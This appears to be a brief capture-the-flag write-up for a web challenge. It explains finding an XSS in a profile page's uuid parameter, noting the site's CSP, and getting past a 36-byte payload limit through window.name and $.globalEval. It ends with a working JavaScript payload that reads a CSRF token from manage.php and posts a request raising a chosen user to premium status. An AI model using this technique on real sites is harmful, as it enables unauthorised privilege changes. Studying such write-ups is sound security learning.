This site supports some simple functions such as login、register、profile、support.

When we change support's link, we can let server access our site.

After receiving the request, we can find the client is Firefox, so there is no XSS Auditor.

Content-Security-Policy looks like:

``Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;``

After some test, we find there is an XSS in profile with uuid. However, the payload limit to 36 bytes. But We can use ``window.name`` to bypass this limit. We can use ``window.open`` to open a new window with a long ``window.name`` which contain our payload, and execute it with ``$.globalEval(name)``. Our payload looks like:

```javascript
window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', `
    $.get("manage.php", function(data){    
            var t = /name="token" value="([^"]+)/.exec(data);
            $.post("manage.php", {user_uuid: "0de84e6e-3185-4f61-9f5b-42dd3d450018", token: t[1], status: "premium"}); 
     });
`);
```
